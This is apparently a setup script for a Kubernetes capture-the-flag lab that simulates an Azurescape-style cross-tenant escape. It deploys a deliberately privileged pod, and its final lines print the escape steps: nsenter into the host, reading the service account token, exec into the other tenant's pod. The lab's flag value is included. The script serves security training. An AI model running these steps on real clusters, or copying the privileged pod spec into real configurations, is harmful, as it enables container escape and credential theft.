#!/bin/bash
set -euo pipefail
K8S_ID="cloud-19"
CLUSTER_NAME="cve-cloud19-multitenant"
source "$(dirname "$0")/../../scripts/k8s-common.sh"

echo "[CLOUD-19] Multi-Tenant K8s: Container Escape → Cross-Tenant Pod Access"
echo "[*] Simulates Azurescape-style cross-tenant attack via shared KIND node"
k8s_init
k8s_create_cluster
k8s_wait_ready
k8s_create_host_flag

# Create tenant namespaces
kubectl create namespace tenant-a
kubectl create namespace tenant-b

# Deploy privileged attacker pod in tenant-a (simulates compromised container)
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: tenant-a
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: attacker
      image: python:3.11-slim
      command: ["sleep", "infinity"]
      securityContext:
        privileged: true
YAML

# Deploy target pod in tenant-b with flag
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: target
  namespace: tenant-b
spec:
  containers:
    - name: target
      image: nginx:1.24-alpine
      env:
        - name: FLAG
          value: "flag{cloud-19-cross-tenant}"
YAML

echo "[+] CLOUD-19 Ready"
echo "    Cluster: $CLUSTER_NAME"
echo "    Attacker (tenant-a): kubectl exec -it -n tenant-a attacker -- sh"
echo "    Target (tenant-b): kubectl get pods -n tenant-b"
echo "    Exploit: nsenter --target 1 --mount --uts --ipc --net --pid -- sh"
echo "    Then: cat /var/run/secrets/kubernetes.io/serviceaccount/token"
echo "    Use bridge SA token to kubectl exec into tenant-b/target"
echo "    Flag: env | grep FLAG inside target pod"
